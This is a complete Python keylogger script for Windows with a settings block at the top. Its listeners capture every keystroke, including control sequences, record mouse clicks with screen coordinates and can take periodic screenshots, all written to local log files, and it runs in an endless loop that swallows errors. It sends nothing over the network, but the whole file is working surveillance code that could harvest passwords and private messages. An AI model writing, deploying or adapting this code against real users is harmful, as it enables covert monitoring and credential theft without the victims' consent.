##################################################################### Customize these values to your liking.
####################### General Settings

# Either absolute or relative folder path name for the logs. Please use forward slashes "/". Leave "." for current directory.
LOGS_PATHNAME = "."

####################### Key Logging Settings

# Whether to disable key logging.
DISABLE_KEY_LOGGING = False

# Keylog file name. This will be created in the same directory as this script.
KEYLOG_FILENAME = "keylog.txt"

# Whether to enable escape sequences logging (CTRL + key) logging.
ESCAPE_SEQUENCES_LOGGING = True

# Conversion of command names to characters. Blank strings are ignored buttons.
KEY_STRING_CONVERT = {
    "[SPACE]": " ",
    "[SHIFT]": "",
    "[SHIFT_R]": "",
    "[CTRL_L]": "",
    "[CTRL_R]": "",
    "[ALT_L]": "[ALT]",
    "[ALT_GR]": "",
    "[96]": "0",
    "[97]": "1",
    "[98]": "2",
    "[99]": "3",
    "[100]": "4",
    "[101]": "5",
    "[102]": "6",
    "[103]": "7",
    "[104]": "8",
    "[105]": "9",
    "[106]": "*",
    "[107]": "+",
    "[108]": ",",
    "[109]": "-",
    "[110]": ".",
    "[111]": "/",
    "[F12]": "[EXIT]", # Exit key
}

####################### Mouse Logging Settings

# Whether to disable mouse logging.
DISABLE_MOUSE_LOGGING = False

# Format for the mouse click string. This will be after the click string is converted.
MOUSE_STRING_FORMAT = "[{btn}MB_{x},{y}]"

# Whether to ignore multiple & same mouse clicks. Only the first click will be logged.
IGNORE_SAME_MOUSE_CLICKS = True

# Conversion of mouse button names to characters. Blank strings are ignored buttons.
CLICK_STRING_CONVERT = {
    "LEFT": "L",
    "RIGHT": "R",
    "MIDDLE": "M",
    "X1": "4",
    "X2": "5",
}

####################### Screenshot Logging Settings

# Whether to disable screenshot logging.
DISABLE_SCREENSHOT_LOGGING = True

# Screenshot file name format. "{index}" is an incrementing number.
SCREENSHOT_FILENAME_FORMAT = "prtscr_{index}.png"

# Interval between screenshots in seconds.
SCREENSHOT_INTERVAL = 10

# Don't take a screenshot if the user has been inactive since taking the last one.
SCREENSHOT_INACTIVITY_SKIP = True

##################################################################### End


import os, win32api
from pynput import keyboard, mouse
from time import sleep
from threading import Timer as Interval
from PIL.ImageGrab import grab as screenshot



# Last click
last_click = None

# Writes a string to the keylog file
def write_string(string):
    print(string, end="")

    with open(os.path.join(LOGS_PATHNAME, KEYLOG_FILENAME), "a+") as f:
        f.write(string)

    if (string == "[EXIT]"):
        raise os._exit(0)

# Writes a key press to the keylog file
def write_key(key):
    # Is a numpad key (weird behavior with these)
    if (hasattr(key, "vk") and key.vk >= 96 and key.vk <= 111):
        string = f"[{str(key.vk)}]"

    # Is an alphanumeric key
    elif (hasattr(key, "char") and key.char != None):
        # escape sequence (CTRL + key)
        if (len(str(key)[1:-1]) == 4):
            if (ESCAPE_SEQUENCES_LOGGING):
                string = f"[CTRL^{str(chr(key.vk))}]"
            else:
                string = ""
        # no escape sequence
        else:
            string = str(key.char)

    # Is a special key
    elif (hasattr(key, "name")):
        string = f"[{str(key.name).upper()}]"

    # Is anything else (fallback)
    else:
        string = f"[{str(key)}]"

    if (string in KEY_STRING_CONVERT):
        string = KEY_STRING_CONVERT[string]

    if (string == ""):
        return
    else:
        global last_click
        last_click = None

    write_string(string)

# Writes a mouse click to the keylog file
def write_click(x, y, button, pressed):
    if (pressed):
        string = button.name.upper()

        global last_click
        if (IGNORE_SAME_MOUSE_CLICKS and string == last_click):
            return
        else:
            last_click = string

        if (string in CLICK_STRING_CONVERT):
            string = CLICK_STRING_CONVERT[string]

        if (string == ""):
            return

        letter = MOUSE_STRING_FORMAT.format(btn=string, x=x, y=y)
        write_string(letter)



# Returns the number of seconds since the last user input
def inactivity_seconds():
    return (win32api.GetTickCount() - win32api.GetLastInputInfo()) / 1000.0

# Returns the next filename in a sequence
def next_filename_index(folder, str_format):
    index = 0
    while ( os.path.exists( os.path.join(folder, str_format.format(index=index)) ) ):
        index += 1
    return os.path.join(folder, str_format.format(index=index))

# Take a screenshot every 5 seconds
def start_screenshot_timer():
    if (SCREENSHOT_INACTIVITY_SKIP == False or inactivity_seconds() < SCREENSHOT_INTERVAL):
        screenshot().save(next_filename_index(LOGS_PATHNAME, SCREENSHOT_FILENAME_FORMAT))

    Interval(SCREENSHOT_INTERVAL, start_screenshot_timer).start()



# Start logging
try:
    if (os.path.exists(LOGS_PATHNAME) == False):
        os.mkdir(LOGS_PATHNAME)

    if (DISABLE_KEY_LOGGING == False):
        keyboard.Listener(on_press=write_key).start()

    if (DISABLE_MOUSE_LOGGING == False):
        mouse.Listener(on_click=write_click).start()

    if (DISABLE_SCREENSHOT_LOGGING == False):
        start_screenshot_timer()

    # Keep the script running
    while True:
        sleep(3600)
except:
    pass